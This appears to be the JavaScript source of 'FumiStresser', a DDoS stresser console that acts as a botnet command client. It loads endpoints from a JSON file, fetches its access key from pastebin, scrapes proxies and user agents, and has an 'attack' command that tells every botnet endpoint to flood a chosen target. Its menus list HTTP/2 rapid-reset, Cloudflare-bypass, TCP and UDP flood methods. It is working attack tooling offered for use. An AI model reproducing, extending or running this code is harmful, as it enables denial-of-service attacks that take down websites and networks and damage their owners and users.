const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const gradient = require('gradient-string');
const fs = require('fs')
const chalk = require('chalk')
const dns = require('dns');
const { promisify } = require('util');
const Table = require('cli-table3');
const os = require('os');
const fetch = require('node-fetch');
const figlet = require('figlet');
const whois = require('whois-json');
const axios = require('axios')
const path = require('path')
const version = '5.1.9'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

// Koneksi ke MongoDB
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //

async function banner() {
console.clear()
console.log(`
[ \x1b[32mSYSTEM\x1b[0m ] Welcome To FumiStresser Tools
[ \x1b[32mSYSTEM\x1b[0m ] Owner @VINNHAX-7788

\x1b[1m\x1b[35m
   ____           _         ______                         
  / __/_ ____ _  (_) ____  / __/ /________ ___ ___ ___ ____
\x1b[34m / _// // /  ' \/ / /___/ _\ \/ __/ __/ -_|_-<(_-</ -_) __/
/_/  \_,_/_/_/_/_/       /___/\__/_/  \__/___/___/\__/_/   
 \x1b[0m
\x1b[1m
\x1b[31m| \x1b[34mUser : \x1b[32mVINNHAX \x1b[31m| \x1b[34mVip : \x1b[32mVip \x1b[31m| \x1b[34mSuperVip : \x1b[32m Mega Vip
\x1b[31m| \x1b[34mAdmin :\x1b[32m VINNHAX \x1b[31m| \x1b[34mExperid :\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit : \x1b[32m No Limited 
\x1b[31m| \x1b[36mFumiStresser-Tools 2025-2026 \x1b[31m| \x1b[36mt.me/vinnhax7788\x1b[0m

Please Type \x1b[1m\x1b[32mhelp\x1b[0m  For Show All Menu
\x1b[34m______________________________________________________________________________\x1b[0m
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
// [========================================] //
// [========================================] //
async function bootup() {
  try {
    console.clear();
    console.log('Starting bootup...');
    
    await exec('npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent');

    // Mengambil password dari file sigma.txt
    const secretBangetJir = await fetch('https://pastebin.com/raw/FxWaC6eH');
    const password = await secretBangetJir.text();
    console.log('Password fetched.');

    // Meminta input dari pengguna untuk key
    console.clear();
    permen.question(`[ ! ] \x1b[34mMasukkan-Password\x1b[0m > `, async (skibidi) => {
      if (skibidi === password.trim()) {
        await scrapeProxy();
        await scrapeUserAgent();
        console.clear()
        console.log('[ ! ] \x1b[32mCORRECT KEY ✓\x1b[0m');
        await sleep(700);
        console.clear();
        console.log(`F U M I - S T R E S S E R`);
        await sleep(1000);
        await banner();
        sigma();
      } else {
        console.log('Wrong Key');
        process.exit(-1);
      }
    });

  } catch (error) {
    console.log('Error during bootup:', error);
    process.exit(-1); 
  }
}
// [========================================] //
async function deleteBotnetEndpoint(args) {
    if (args.length < 1) {
        console.log(`Example: delapi <endpoint>
delapi http://1.1.1.1:2000`);
        sigma();
        return;
    }

    const endpointToDelete = args[0];

    // Load botnet data
    let botnetData;
    try {
        const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
        botnetData = JSON.parse(data);
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return;
    }

    // Check if endpoint exists
    const index = botnetData.endpoints.indexOf(endpointToDelete);
    if (index === -1) {
        console.log(`Endpoint ${endpoint} not found in the botnet list.`);
        sigma();
        return;
    }

    // Remove endpoint
    botnetData.endpoints.splice(index, 1);

    // Save updated data
    try {
        await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        console.log(`Endpoint ${endpoint} has been removed from the botnet.`);
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }

    sigma();
}
//========================================//
async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    console.clear()
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
async function Botnethitam(args) {
    if (args.length < 3) {
        console.log(`.    Example: attack <target> <duration> <methods>.    
              attack https://google.com 120 flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        let botnetData;
        let successCount = 0;
        const timeout = 20000;
        const validEndpoints = [];

        // Load botnet data
        try {
            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Kirim permintaan ke setiap endpoint
        const requests = botnetData.endpoints.map(async (endpoint) => {
            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

            try {
                const response = await axios.get(apiUrl, { timeout });
                if (response.status === 200) {
                    successCount++;
                    validEndpoints.push(endpoint);
                }
            } catch (error) {
                console.error(`Error sending request to ${endpoint}: ${error.message}`);
            }
        });

        await Promise.all(requests);

        // Simpan endpoint yang valid kembali ke file
        botnetData.endpoints = validEndpoints;
        try {
            fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            sigma();
        }

        // Tambahkan proses ke daftar proses aktif
        const endTime = Date.now() + duration * 1000;
        processList.push({
            ip: result.query,
            target,
            startTime: Date.now(),
            endTime,
            duration,
            methods,
        });

        // Cetak detail serangan
        console.clear();
        console.log(`
${chalk.white.bold(`Type ${chalk.red.bold(`"cls"`)} to return to the menu`)}\n\n
${gradient('cyan', 'blue')("                   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ")}${chalk.white.bold("╔═╗╔═╗╔╗╔╔╦╗")}
${gradient('cyan', 'blue')("                   ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}${chalk.white.bold(" ╚═╗║╣ ║║║ ║")}
${gradient('cyan', 'blue')("                   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}${chalk.white.bold(" ╚═╝╚═╝╝╚╝ ╩")}
                            
${gradient('cyan', 'blue')('          ╚╦════════════════════════════════════════════╦╝')}
${gradient('cyan', 'blue')('     ╔═════╩════════════════════════════════════════════╩═════╗')}
${chalk.white.bold(`                       ATTACK HAS BEEN ${chalk.red.bold('STARTED!')}`)}
${chalk.white.bold(`             TARGET   : [ ${target} ]`)}
${chalk.white.bold(`             TIME     : [ ${duration} ]`)}
${chalk.white.bold(`             METHODS  : [ ${methods} ]`)}
${chalk.white.bold(`             AS       : [ ${result.as} ]`)}
${chalk.white.bold(`             ISP      : [ ${result.isp} ]`)}
${chalk.white.bold(`             IP       : [ ${result.query} ]`)}
${gradient('cyan', 'blue')('     ╚════════════════════════════════════════════════════════╝')}
 
`);
        sigma();
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/putraganteng`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/putraganteng';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
BlackHole Tools 

Thx To:
permen ( Base )
Jerry
Cella
Putra ( Development )
`
permen.question('[ \x1b[31m\u001b[47;1mFumiStresser-Console\x1b[0m ] > ', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.clear()
    console.log(`
\x1b[38;2;173;150;255m 
                          ╦ ╦╔═╗╦  ╔═╗  ╔╦╗╔═╗╔╗╔╦ ╦
                          ╠═╣║╣ ║  ╠═╝  ║║║║╣ ║║║║ ║
                          ╩ ╩╚═╝╩═╝╩    ╩ ╩╚═╝╝╚╝╚═╝.         \x1b[0m
              ═════╦═══════════════════════════════════════╦═════
            ╔═══╦══╩══════╦════════════════════════════════╩═══════╗
            ║ # ║  NAME   ║    DESCRIPTION OF FUNCTION             ║
            ╠═══╬═════════╬════════════════════════════════════════╣
            ║ 1 ║\x1b[1m\x1b[36m methods \x1b[0m║ show methods menu for tools            ║
            ║ 2 ║\x1b[1m\x1b[36m scrape  \x1b[0m║ show your running attack botnet        ║
            ║ 3 ║\x1b[1m\x1b[36m monitor \x1b[0m║ show your running attack               ║
            ║ 4 ║\x1b[1m\x1b[36m cls     \x1b[0m║ clear terminal and return to main page ║
            ║ 5 ║\x1b[1m\x1b[36m addsrv  \x1b[0m║ add server botnet panel/vps            ║
            ║ 6 ║\x1b[1m\x1b[36m testsrv \x1b[0m║ cek botnet                             ║
            ║ 7 ║\x1b[1m\x1b[36m attack  \x1b[0m║ attack botnet server                   ║
            ║ X ║ .....   ║ THIS FUNCTION DOES NOT EXIST           ║
            ╚═══╩═════════╩════════════════════════════════════════╝
`);
    sigma();
  } else if (command === 'methods') {
    console.clear()
    console.log(`
🟢 | Username : \x1b[32mVINNHAX  \x1b[0m| Vip : \x1b[32mtrue  \x1b[0m| Super Vip :  \x1b[32mtrue 
\x1b[38;2;173;150;255m     
              ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔══  ╔═╗╔═╗╔═╗╔═╗   
              ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗  ╠═╝╠═╣║ ╦║╣    
              ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝  ╩  ╩ ╩╚═╝╚═╝   \x1b[0m
     
[ Methods Basic ]
- .[\x1b[1m\x1b[36mchap\x1b[0m: high request per/s optimized for bypassing UAM.
- .[\x1b[1m\x1b[36mhttp\x1b[0m: stable request per/s bypassing Cloudflare no protect.
- .[\x1b[1m\x1b[36mflood\x1b[0m: flood high request for optimized bypassing Cloudflare.
- .[\x1b[1m\x1b[36mfire\x1b[0m: high request per/s optimized for target no protect.
- .[\x1b[1m\x1b[36mtls\x1b[0m: high request per/s, for ISP Google LLC.

[ Methods VIP ]
- .[\x1b[1m\x1b[36mbrowser\x1b[0m: request per/s for bypassing captcha, recaptcha, UAM.
- .[\x1b[1m\x1b[36mh2-ciko\x1b[0m: HTTP/2 stable requests, optimized for bypass no protect.
- .[\x1b[1m\x1b[36mh2-flash\x1b[0m: HTTP/2 for bypassing Cloudflare, HTTP DDOS.
- .[\x1b[1m\x1b[36mh2-gecko\x1b[0m: HTTP/2 high requests per/s bypassing Cloudflare.
- .[\x1b[1m\x1b[36mh2-flood\x1b[0m: high request per/s optimized for bypassing UAM.
- .[\x1b[1m\x1b[36mh2-rapid\x1b[0m: HTTP/2 rapid reset source, for bypassing Cloudflare.
- .[\x1b[1m\x1b[36mh2-meris\x1b[0m: HTTP/2 rapid reset source, for bypassing Cloudflare.

[ Methods Layer 4 ]
- .[\x1b[1m\x1b[36mtcp\x1b[0m: strong TCP flood with high packet for optimized PPS.
- .[\x1b[1m\x1b[36mudp\x1b[0m: UDP flood with high packet for optimized GBPS.
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'scrapee3eeeeee') {
    exec('node /lib/cache/scrape.js', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    
    sigma();
        } else if (command === 'addussssjdjdjer') {
    addUser(username, password, VIP, maxtime);    
    } else if (command === 'addsrv') {
    processBotnetEndpoint(args);
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
  } else if (command === 'attack') {
    Botnethitam(args);
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'm') {
    monitorOngoingAttacks()
    sigma()
  } else if (command === 'monitor') {
    monitorOngoingAttacks()
    sigma()
  } else if (command === 'c') {
    console.clear()
    banner()
    sigma()
  } else if (command === 'cls') {
    console.clear()
    banner()
    sigma()
  } else if (command === 'exit') {
  process.exit(-1)    
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
